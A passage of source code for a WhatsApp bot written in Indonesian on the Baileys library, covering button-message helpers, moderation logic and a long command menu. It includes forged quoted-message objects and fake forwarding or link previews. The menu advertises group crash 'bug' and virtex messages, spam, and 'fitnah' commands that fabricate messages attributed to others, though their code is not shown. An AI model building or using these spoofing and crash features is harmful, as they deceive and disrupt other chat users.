		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'gifPlayback': 'true', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  } 
// TEXT WITH THUMBNAIL
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `Hai ${pushname}`,
                 "title": `Saya Nata-Bot`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
// VN
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "99999",
                 "ptt": "true"
                        }
	                  } 
                     }
                     //By nayla / rimurubotz
			const reply = (teks) => {
			const B1C = {contentText: teks, footerText: `${TextDiButton}`, headerType: 1}      
			Bambang.sendMessage(from, B1C, MessageType.buttonsMessage, {quoted:floc3,contextInfo: {forwardingScore: 508, isForwarded: true}})}		
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Bambang.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Images
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Bambang.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Bambang.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Bambang.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Bambang.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Bambang.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Bambang.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
/// BY PEMUDA TEKNOLOGI TQ YA:v
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await Bambang.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
Bambang.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// By Zeeone
//Auto Vn+Ktk
if (autovn) {
	if (autovn === false) return
await Bambang.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await Bambang.updatePresence(from, Presence.composing)
}
// By itsmevall
    antical = true
Bambang.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
Bambang.sendMessage(call, `*Sorry can't receive calls.*\n*Call = Block!*`, MessageType.text)
.then(() => Bambang.blockUser(call, "add"))
})
////Jan Di Jual
const replyfakelink = (teks) => {
Bambang.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Bot By ${NamaOwner}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/JQ8x6mx/0e4d1b4b709c.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : mek})
}
const replywa = (teks) => {
Bambang.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `${NamaBot}`,
                "body": `${FakePdf}`,
                "mediaType": "10",
                "mediaUrl": `${GrubBot}`,
                "thumbnailUrl": "https://i.ibb.co/JQ8x6mx/0e4d1b4b709c.jpg",
                "thumbnail": fake,
                "sourceUrl": `${GrubBot}`,
},mentionedJid:[sender]}, quoted : mek})
}
const fakeyt = (teks) => {
Bambang.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `${FakeYt}` ,
"body": `${FakeYt}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/JQ8x6mx/0e4d1b4b709c.jpg",
"mediaUrl": "https://youtu.be/uygjD8rqVLE",
"thumbnail": fs.readFileSync('./media/canss.jpg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : mek})
}
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		
		/////// ANTI LINK:)
                if (budy.includes("https://chat.whatsapp.com/")) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply ('Admin Mah Bebas')
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(` *「 GROUP LINK DETECTOR 」*\nAwokawok Ngemis Member Gc😍\nByee ${sender.split("@")[0]}`)
				setTimeout(() => {
				Bambang.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 3000)
			    }
			   /// Htag    
			 //   if (!isGroup && !isAntihidetag && !m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length ) { console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white"))
			//    if (!isgroupOwner) return
       //        reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`)
       //        Bambang.groupRemove(from, sender)
        //       }
               /// Virtex
               if (isGroup && isAntiVirtex && !mek.key.fromMe) {
               if (budy.length > 10000) {
               if (isGroupAdmins) return reply('Admin Mah Bebas Bwang:v')
               reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK")
               Bambang.groupRemove(from, sender);
               }
               }
        
let {
    banChats,
} = setting

function banChat() {
    if (banChats == true) {
        return false
    } else {
        return true
    }
}
        
        // Sewa
             _sewa.expiredCheck(Bambang, sewa)
             
        // MUTE
             if (isMuted){
             if (!isGroupAdmins && !isPremium) return
 }
 //// CHAT
       const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await Bambang.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
} 
            
              const getWin = (userId) => {
              let position = false
              Object.keys(_win).forEach((i) => {
              if (_win[i].jid === userId) {
              position = i
       }
        })
              if (position !== false) {
              return _win[position].win
            }
        }
// AFK
	if (isGroup) {
		if (!mek.key.fromMe && mek.key.fromMe) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `Ssst Ganggu Aja Dia Lagi ${getReason} Sejak ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(sender, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(sender, _afk)
		    const getReason = afk.getAfkReason(sender, _afk)
		    const ittung = ms(await Date.now() - getTime)
		    const pep = `*${pushname}* Telah Kembali Online`
		    reply(pep)
		    _afk.splice(afk.getAfkPosition(sender, _afk), 1)
		    fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
		}
	    }
	        function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
      // CMD
        if (isCmd && !isGroup)		
            console.log(color('[ BOT ]'), color(time, 'red'), color(`${command} [${args.length}]`), 'from', color(pushname))
        
        if (isCmd && isGroup)            
            console.log(color('[ BOT ]'), color(time, 'red'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
            
            Bambang.chatRead(from, "read")
            
            switch(command){
            //Verify
case 'verify':
if (isRegistered) return reply('Lu Udh Daftar')
try {
               ppnya = await Bambang.getProfilePicture(mem)
                } catch (e) {
                ppnya = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
const serialUser = createSerial(20)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	        ofrply = await getBuffer(`https://hardianto.xyz/api/tools/verification?nama=${pushname}&namaGb=${set.NamaBot}&pepeGb=https://textpro.me/images/user_image/2021/12/61c95e00a7b9f.jpg&sn=${_registered.length}&pepeUser=${ppnya}&bege=https://www.linkpicture.com/q/20211125_113317.jpg&apikey=hardianto`)
	         const jancok = `
❒ 「 ${pushname} 」 ❒
*Nama :* _${pushname}_
*Nomor :* _@${sender.split('@')[0]}_
*Seri :* _${serialUser}_
*Pengguna :* _${_registered.length}_

*「 ${NamaBot} 」*`
gbutsan = [
{buttonId:`#menu`,buttonText:{displayText:'️MENU‍☠️'},type:1},
{buttonId:`#donasi`,buttonText:{displayText:'💗DONASI💗'},type:1}
]
mhan = await Bambang.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:`Terimakasih Sudah Mendaftar\n*_© ${NamaOwner}*`, 
buttons: gbutsan,
headerType: 4
}
Bambang.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:ftrol, contextInfo: { mentionedJid: [sender]}})
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
        break
            //Mnu
                        case 'menu': case 'help': case 'allmenu': case 'command':
            groups = Bambang.chats.array.filter(v => v.jid.endsWith('g.us'))
            privat = Bambang.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
            ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
            charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
            uptime = process.uptime();
            timestampe = speed();
            totalChat = await Bambang.chats.all()
            latensie = speed() - timestampe
            total = math(`${groups.length}*${privat.length}`)
            stst = await Bambang.getStatus(`${sender.split('@')[0]}@c.us`)
		    stst = stst.status == 401 ? '' : stst.status        
		    ptod = `${NOwner}`
		    utod = `${botNumber}`
            stod = `${sender}`
            allmenuuu =`
${tampilUcapan} *${pushname}*  



${atas} 
${bates} 🌹 _Bot & Owner Info_ 
${garis} *Nama Bot* : ${NamaBot}
${garis} *Owner* : ${NamaOwner}
${garis} *Tag Owner* : @${ptod.split('@')[0]}
${garis} *Tag Bot* : @${utod.split('@')[0]}
${garis} *Total Pc* : ${privat.length}
${garis} *Total Gc* : ${groups.length}
${garis} *Total Chat* : ${totalchat.length}
${garis} *Total Hit* : ${totalhit}
${garis} *Total User* : ${_registered.length}
${garis} *Speed* : ${latensie.toFixed(4)} _sec_
${garis} *Runtime* : ${runtime(process.uptime())}
${garis} *Baterai* : ${baterai}
${garis} *Cas* : ${charger}
${garis} *Wa Version* : ${Bambang.user.phone.wa_version}
${garis} *Hostname* : ${os.hostname()}
${garis} *Platform* : ${os.platform()}
${garis}
${bates} 👤 _User Info_
${garis} *Nama* : ${pushname}
${garis} *Nomor* : wa.me/${stod.split('@')[0]}
${garis} *Tag* : @${stod.split('@')[0]}
${garis} *Bio* : ${stst}
${garis} *User Type* : ${isOwner ? 'OwnerBot' : isPremium ? 'Premium' : 'Free'}
${garis}
${bates} 🗓️ _Today Info_
${garis} *Tanggal* : ${time} 
${garis} *Wib* : ${wib} 
${garis} *Wit* : ${wit}
${garis} *Wita* : ${wita}
${garis}
${bawah}  
${atas}
${bates} 🌹 _Big Thanks To_
${garis}
${garis} *Tuhan Ku*
${garis} *Orang Tua Ku*
${garis} *Bailyes* [ Tq Bgt :v ]
${garis} *Heroku* [ Web Run Bot ]
${garis} *Yuriko* [ Tq base nya ]
${garis} *Nayla* [ Tq case nya ]
${garis} *Zeeone Ofc* [ Tq case nya ]
${garis} *Bambang* [ Pembuat Bot ]
${garis} *${NamaOwner}* [ Pengembang Bot ]
${bawah}   
`            
Sendbutdocument(from, allmenuuu, `${atas}
${bates} *ADMIN MENU* 🤴
${garis + kotak} ${prefix}welcome < enable/disable >
${garis + kotak} ${prefix}antilink < on/off >
${garis + kotak} ${prefix}kickall
${garis + kotak} ${prefix}promote
${garis + kotak} ${prefix}demote
${garis + kotak} ${prefix}listonline
${garis + kotak} ${prefix}tagall *teks*
${garis + kotak} ${prefix}leave
${garis + kotak} ${prefix}kick *reply*
${garis + kotak} ${prefix}add *+62xxxxxx*
${garis + kotak} ${prefix}setnamegc
${garis + kotak} ${prefix}setppgc
${garis + kotak} ${prefix}setdeskgc
${garis + kotak} ${prefix}sider *reply chat bot*
${garis + kotak} ${prefix}hidetag *teks/reply teks*
${garis + kotak} ${prefix}linkgc
${garis + kotak} ${prefix}getpict [ _@tag_ ]
${garis + kotak} ${prefix}autorespon [_on/off_]
${garis + kotak} ${prefix}getname [ _reply target_ ]
${garis + kotak} ${prefix}getbio [ _reply target_ ]
${garis + kotak} ${prefix}creategrup [ _nama|@tag_ ]
${garis + kotak} ${prefix}getpp
${garis + kotak} ${prefix}getdeskgc [ _teks_ ]
${garis + kotak} ${prefix}hacked [ _teks_ ]
${garis + kotak} ${prefix}fitnah [ _@tag|teks1|teks2_ ]
${garis + kotak} ${prefix}kontak [ _@tag|nama_ ]
${garis + kotak} ${prefix}kontag [ _@tag|nama_ ]
${garis + kotak} ${prefix}resetlinkgc
${garis + kotak} ${prefix}sticktag [ _nama sticker_ ]
${garis + kotak} ${prefix}totag [ _reply media_ ]
${garis + kotak} ${prefix}bukatime
${garis + kotak} ${prefix}tutuptime
${garis + kotak} ${prefix}leavetime
${bawah}

${atas}
${bates} *OWNER MENU* 👑
${garis + kotak} ${prefix}addrespond  [pertanyaan|jawaban]
${garis + kotak} ${prefix}delrespond
${garis + kotak} ${prefix}listrespond
 ${garis + kotak} ${prefix}setreply
 ${garis + kotak} ${prefix}setfakeimg
 ${garis + kotak} ${prefix}setthumb
 ${garis + kotak} ${prefix}bugcatalog
 ${garis + kotak} ${prefix}buggc id grup
 ${garis + kotak} ${prefix}okvirtex
 ${garis + kotak} ${prefix}delete [_@tagpesan_]
 ${garis + kotak} ${prefix}unarchive
 ${garis + kotak} ${prefix}archive
 ${garis + kotak} ${prefix}unarchiveall
 ${garis + kotak} ${prefix}piltek
 ${garis + kotak} ${prefix}gift
 ${garis + kotak} ${prefix}readall
 ${garis + kotak} ${prefix}unreadall
 ${garis + kotak} ${prefix}delchat
 ${garis + kotak} ${prefix}anticall [_on/off_]
 ${garis + kotak} ${prefix}autoread [_gc/pc on/ gc/pc off]
 ${garis + kotak} ${prefix}autojoin [_on/off_]
 ${garis + kotak} ${prefix}mute
 ${garis + kotak} ${prefix}unmute
 ${garis + kotak} ${prefix}spam [ _teks|jumlah_ ]
 ${garis + kotak} ${prefix}demoteall
 ${garis + kotak} ${prefix}promoteall
 ${garis + kotak} ${prefix}spamsw [ _teks|jumlah_ ]
 ${garis + kotak} ${prefix}upswteks [ _teks_ ]
 ${garis + kotak} ${prefix}upswlokasi [ _teks_ ]
 ${garis + kotak} ${prefix}upswaudio [ _reply audio_ ]
 ${garis + kotak} ${prefix}upswvoice [ _reply audio_ ]
 ${garis + kotak} ${prefix}upswsticker [ _reply sticker_ ]
 ${garis + kotak} ${prefix}upswimage [ _reply image with caption_ ]
 ${garis + kotak} ${prefix}upswgif  [ _reply gif with caption_ ]
 ${garis + kotak} ${prefix}upswvideo [ _reply video with caption_ ]
 ${garis + kotak} ${prefix}shutdown
 ${garis + kotak} ${prefix}offline
 ${garis + kotak} ${prefix}online
 ${garis + kotak} ${prefix}exif [ _nama|author_ ]
 ${garis + kotak} ${prefix}setppbot [ _reply image_ ]
 ${garis + kotak} ${prefix}setnamebot [ _teks_ ]
 ${garis + kotak} ${prefix}setprefix [ _multi/nopref/prefix_ ]
 ${garis + kotak} ${prefix}setbio [ _teks_ ]
 ${garis + kotak} ${prefix}leave
 ${garis + kotak} ${prefix}restart
 ${garis + kotak} ${prefix}join [ _link group_ ]
 ${garis + kotak} ${prefix}readall
 ${garis + kotak} ${prefix}unreadall
 ${garis + kotak} ${prefix}pin
 ${garis + kotak} ${prefix}unpin
 ${garis + kotak} ${prefix}nano [ _nama file_ ]
 ${garis + kotak} ${prefix}report [ _teks_ ]
 ${garis + kotak} ${prefix}runtime
${garis + kotak} ${prefix}autoread
${garis + kotak} ${prefix}auto vn/ketik on/off
${garis + kotak} ${prefix}bcnowm
${garis + kotak} ${prefix}bc
${garis + kotak} ${prefix}bc2
${garis + kotak} ${prefix}bcgc
${garis + kotak} ${prefix}bcgc2
${garis + kotak} ${prefix}clearall
${bawah}

${atas}
${bates} *DOWNLOAD MENU* 📥
${garis + kotak} ${prefix}playmp3 [_search_]
${garis + kotak} ${prefix}playmp4 [_search_]
${garis + kotak} ${prefix}tts [_katakatanya_]
${garis + kotak} ${prefix}cecan
${garis + kotak} ${prefix}cogan
${garis + kotak} ${prefix}fetch [ _link_ ]
${garis + kotak} ${prefix}igdl [ _link_ ]
${garis + kotak} ${prefix}tiktokdl [ _link_ ]
${garis + kotak} ${prefix}infogempa
${garis + kotak} ${prefix}resepmasakan [ _judul_ ]
${garis + kotak} ${prefix}artimimpi [ _teks_ ]
${garis + kotak} ${prefix}bilangangka [ _angka_ ]
${garis + kotak} ${prefix}kalkulator [ _angka_ ]
${garis + kotak} ${prefix}fancytext [ _teks_ ]
${garis + kotak} ${prefix}githubstalk  [ _username_ ]
${garis + kotak} ${prefix}igstalk [ _link_ ]
${garis + kotak} ${prefix}twitter [ _link_ ]
${garis + kotak} ${prefix}twmp3 [ _link_ ]
${garis + kotak} ${prefix}linkwa [ _search_ ]
${garis + kotak} ${prefix}fb [ _link_ ]
${garis + kotak} ${prefix}chara [ _search_ ]
${garis + kotak} ${prefix}otaku [ _search_ ]
${garis + kotak} ${prefix}komiku [ _search_ ]
${garis + kotak} ${prefix}play [ _judul lagu_ ]
${garis + kotak} ${prefix}tinyurl  [ _link_ ]
${garis + kotak} ${prefix}google [ _search_ ]
${garis + kotak} ${prefix}gimage [ _search_ ]
${garis + kotak} ${prefix}wiki [ _search_ ]
${garis + kotak} ${prefix}mediafire [ _link_ ]
${garis + kotak} ${prefix}ytsearch [ _judul_ ]
${garis + kotak} ${prefix}ytmp3 < Link >
${garis + kotak} ${prefix}ytmp4 < Link >
${garis + kotak} ${prefix}tiktok < link >
${garis + kotak} ${prefix}ttnowm < link >
${garis + kotak} ${prefix}ttwm < link >
${bawah}

${atas}
${bates} *RANDOM MENU* 👻
${garis + kotak} ${prefix}rate
${garis + kotak} ${prefix}kapankah
${garis + kotak} ${prefix}apakah
${garis + kotak} ${prefix}bisakah
${garis + kotak} ${prefix}caripesan [ _teks|jumlah_ ] 
${garis + kotak} ${prefix}slot
${garis + kotak} ${prefix}suit [ _gunting/batu/kertas_ ]
${garis + kotak} ${prefix}tag [ _nomor_ ]
${garis + kotak} ${prefix}tagme
${garis + kotak} ${prefix}readmore [ _teks1|teks2_ ]
${garis + kotak} ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
${garis + kotak} ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
${garis + kotak} ${prefix}pantun
${garis + kotak} ${prefix}truth
${garis + kotak} ${prefix}dare
${garis + kotak} ${prefix}darkjoke
${garis + kotak} ${prefix}meme
${garis + kotak} ${prefix}quotes
${garis + kotak} ${prefix}Quotesislami
${garis + kotak} ${prefix}Quotessadboy
${garis + kotak} ${prefix}Quotesanime
${garis + kotak} ${prefix}quotesmaker
${garis + kotak} ${prefix}katailham
${garis + kotak} ${prefix}katadilan
${garis + kotak} ${prefix}nekonime
${garis + kotak} ${prefix}listimage
${garis + kotak} ${prefix}takestick [ _nama|author_ ]
${garis + kotak} ${prefix}detikvn [ _reply audio caption angka_ ]
${garis + kotak} ${prefix}detikvideo [ _reply video caption angka_ ]
${garis + kotak} ${prefix}liststicker
${garis + kotak} ${prefix}listvn
${garis + kotak} ${prefix}addsticker [ _nama_ ]
${garis + kotak} ${prefix}delsticker [ _nama_ ]
${garis + kotak} ${prefix}addvn [ _nama_ ]
${garis + kotak} ${prefix}delvn [ _nama_ ]
${garis + kotak} ${prefix}addimage [ _nama_ ]
${garis + kotak} ${prefix}delimage [ _nama_ ]
${bawah}

${atas}
${bates} *SEARCHING MENU* 🔎
${garis + kotak} ${prefix}pinterest < Query >
${garis + kotak} ${prefix}playstore < nama apk >
${garis + kotak} ${prefix}linkwa < nama gc >
${garis + kotak} ${prefix}lirik < judul lagu >
${garis + kotak} ${prefix}wikipedia < query >
${garis + kotak} ${prefix}kbbi < query >
${garis + kotak} ${prefix}kodepos < nama kota >
${bawah}

${atas}
${bates} *TO MENU* 🔘
${garis + kotak} ${prefix}img2url < Reply Foto >
${garis + kotak} ${prefix}tourl < Reply Foto >
${garis + kotak} ${prefix}tovideo < ReplyStikerGif >
${garis + kotak} ${prefix}toimg < ReplyStiker >
${garis + kotak} ${prefix}tomp3 < ReplyVideo >
${garis + kotak} ${prefix}emoji2png < Emoji >
${bawah}

${atas}
${bates} *MUSIC EDIT* 🎶
${garis + kotak} ${prefix}bass < ReplyAudio/Vn >
${garis + kotak} ${prefix}balik < ReplyAudio/Vn >
${garis + kotak} ${prefix}gemuk < ReplyAudio/Vn >
${garis + kotak} ${prefix}robot < ReplyAudio/Vn >
${bawah}

${atas}
${bates} *ANIME MENU* 🕺
${garis + kotak} ${prefix}saitama
${garis + kotak} ${prefix}gon
${garis + kotak} ${prefix}killua
${garis + kotak} ${prefix}kakashi
${garis + kotak} ${prefix}tsunade
${garis + kotak} ${prefix}orochimaru
${garis + kotak} ${prefix}mitsuki
${garis + kotak} ${prefix}sarada
${garis + kotak} ${prefix}boruto
${garis + kotak} ${prefix}sakura
${garis + kotak} ${prefix}sasuke
${garis + kotak} ${prefix}minato
${garis + kotak} ${prefix}naruto
${garis + kotak} ${prefix}copper
${garis + kotak} ${prefix}nami
${garis + kotak} ${prefix}ussop
${garis + kotak} ${prefix}sanji
${garis + kotak} ${prefix}luffy
${garis + kotak} ${prefix}zoro
${garis + kotak} ${prefix}senku
${garis + kotak} ${prefix}nezuko
${garis + kotak} ${prefix}tanjirou
${garis + kotak} ${prefix}natsu
${garis + kotak} ${prefix}sagiri
${garis + kotak} ${prefix}rimuru
${garis + kotak} ${prefix}anime
${garis + kotak} ${prefix}animesaran2
${garis + kotak} ${prefix}animesaran
${garis + kotak} ${prefix}neko
${garis + kotak} ${prefix}wibu
${garis + kotak} ${prefix}loli
${garis + kotak} ${prefix}waifu
${garis + kotak} ${prefix}husbu
${garis + kotak} ${prefix}killua
${garis + kotak} ${prefix}kurama
${garis + kotak} ${prefix}sagiri
${garis + kotak} ${prefix}hinata
${garis + kotak} ${prefix}kaneki
${garis + kotak} ${prefix}miku
${garis + kotak} ${prefix}shinobu
${garis + kotak} ${prefix}jiraya
${garis + kotak} ${prefix}akira
${garis + kotak} ${prefix}kurumi
${garis + kotak} ${prefix}madara
${garis + kotak} ${prefix}mikasa
${garis + kotak} ${prefix}eren
${garis + kotak} ${prefix}miku
${garis + kotak} ${prefix}animerem
${bawah}

${atas}
${bates} *GENERATE MENU* 🎰
${garis + kotak} ${prefix}balikhuruf < text >
${garis + kotak} ${prefix}bilangangka < angka >
${garis + kotak} ${prefix}jumlahangka < angka >
${garis + kotak} ${prefix}halah < text >
${garis + kotak} ${prefix}hilih < text > 
${garis + kotak} ${prefix}huluh < text >
${garis + kotak} ${prefix}heleh < text >
${bawah}

${atas}
${bates} *MAKER MENU* 🖼️
${garis + kotak} ${prefix}halloween <text>
${garis + kotak} ${prefix}rainbow <text>
${garis + kotak} ${prefix}scfi <text>
${garis + kotak} ${prefix}blue <text>
${garis + kotak} ${prefix}juice <text>
${garis + kotak} ${prefix}purple <text>
${garis + kotak} ${prefix}toxic <text>
${garis + kotak} ${prefix}peridot <text>
${garis + kotak} ${prefix}metal <text>
${garis + kotak} ${prefix}realistic <text>
${garis + kotak} ${prefix}impressive <text>
${garis + kotak} ${prefix}cracked <text>
${garis + kotak} ${prefix}magma <text>
${garis + kotak} ${prefix}thunder <text>
${garis + kotak} ${prefix}berry <text>
${garis + kotak} ${prefix}transformer <text>
${garis + kotak} ${prefix}horror <text>
${garis + kotak} ${prefix}metallic <text>
${garis + kotak} ${prefix}circuit <text>
${garis + kotak} ${prefix}sketch <text>
${garis + kotak} ${prefix}sertiff [ _teks_ ]
${garis + kotak} ${prefix}sertiff2 [ _teks_ ]
${garis + kotak} ${prefix}sertiff3 [ _teks_ ]
${garis + kotak} ${prefix}hartatahta [ _teks_ ]
${garis + kotak} ${prefix}naruto [ _teks_ ]
${garis + kotak} ${prefix}bneon [ _teks_ ]
${garis + kotak} ${prefix}nulis [ _teks_ ]
${garis + kotak} ${prefix}matrix [ _teks_ ]
${garis + kotak} ${prefix}breakwall [ _teks_ ]
${garis + kotak} ${prefix}gneon [ _teks_ ]
${garis + kotak} ${prefix}dropwater [ _teks_ ]
${garis + kotak} ${prefix}flowertext [ _teks_ ]
${garis + kotak} ${prefix}crosslogo [ _teks_ ]
${garis + kotak} ${prefix}silktext [ _teks_ ]
${garis + kotak} ${prefix}flametext [ _teks_ ]
${garis + kotak} ${prefix}glowtext [ _teks_ ]
${garis + kotak} ${prefix}smoketext [ _teks_ ]
${garis + kotak} ${prefix}skytext [ _teks_ ]
${garis + kotak} ${prefix}cslogo [ _teks_ ]
${garis + kotak} ${prefix}lithgtext [ _teks_ ]
${garis + kotak} ${prefix}crismes [ _teks_ ]
${garis + kotak} ${prefix}tfire [ _teks_ ]
${garis + kotak} ${prefix}sandw [ _teks_ ]
${garis + kotak} ${prefix}epep [ _teks_ ]
${garis + kotak} ${prefix}text3dbox [ _teks_ ]
${garis + kotak} ${prefix}text3d
${garis + kotak} ${prefix}qrencode (Qr Creator)
${garis + kotak} ${prefix}barcode
${garis + kotak} ${prefix}gtext
${garis + kotak} ${prefix}logobp [ _teks_ ]
${garis + kotak} ${prefix}leavest [ _teks_ ]
${garis + kotak} ${prefix}thundertext [ _teks_ ]
${garis + kotak} ${prefix}tlight [ _teks_ ]
${garis + kotak} ${prefix}nulis [ _teks_ ]
${garis + kotak} ${prefix}wolflogo [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}pubglogo [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}snowwrite [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}watercolour [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}logoaveng [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}phlogo [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}marvellogo [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}gtext [ _teks1 | teks2_ ]
${garis + kotak} ${prefix}blackpink [ _teks_ ]
${garis + kotak} ${prefix}gplaybutton [_teks_]
${garis + kotak} ${prefix}splaybutton [_teks_]
${bawah}

${atas}
${bates} *GAME MENU* 🎮
${garis + kotak} ${prefix}tictactoe @tag lawan
${garis + kotak} ${prefix}gelud @tag lawan
${garis + kotak} ${prefix}delsesittt
${garis + kotak} ${prefix}delsesigelud
${bawah}

${atas}
${bates} *RANDOM TAG MENU* 🎰
${garis + kotak} ${prefix}ganteng
${garis + kotak} ${prefix}cantik
${garis + kotak} ${prefix}jelek
${garis + kotak} ${prefix}goblok
${garis + kotak} ${prefix}bego
${garis + kotak} ${prefix}pinter
${garis + kotak} ${prefix}jago
${garis + kotak} ${prefix}babi
${garis + kotak} ${prefix}beban
${garis + kotak} ${prefix}baik
${garis + kotak} ${prefix}jahat
${garis + kotak} ${prefix}anjing
${garis + kotak} ${prefix}monyet
${garis + kotak} ${prefix}haram
${garis + kotak} ${prefix}kontol
${garis + kotak} ${prefix}pakboy
